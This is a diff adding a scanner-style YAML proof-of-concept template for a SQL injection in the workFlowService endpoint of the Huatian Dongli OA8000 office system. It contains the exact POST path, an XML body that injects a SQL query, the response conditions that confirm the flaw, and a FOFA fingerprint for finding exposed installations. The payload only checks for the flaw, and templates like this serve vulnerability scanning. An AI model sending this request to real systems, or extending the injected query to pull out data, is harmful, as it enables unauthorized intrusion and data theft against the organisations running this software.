@@ -1,0 +1,26 @@
+id: poc-yaml-hua-tian-dong-li-oa-workflowservice-sqli
+info:
+  name: 华天动力OA workFlowService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 华天动力-OA8000
+  fofa: app="华天动力-OA8000"
+variables:
+  t1: random_int(1000,10000)
+requests:
+- method: POST
+  path: /OAapp/bfapp/buffalo/workFlowService
+  data: "<buffalo-call> \n<method>getDataListForTree</method> \n<string>select md5({{.t1}})</string>\
+    \ \n</buffalo-call>"
+  expression: 'status_code == 200
+
+    && contains(body,"java.util.HashMap")
+
+    && contains(headers,"text/xml")
+
+    && contains(body,md5(t1))
+
+    '
+transport: http
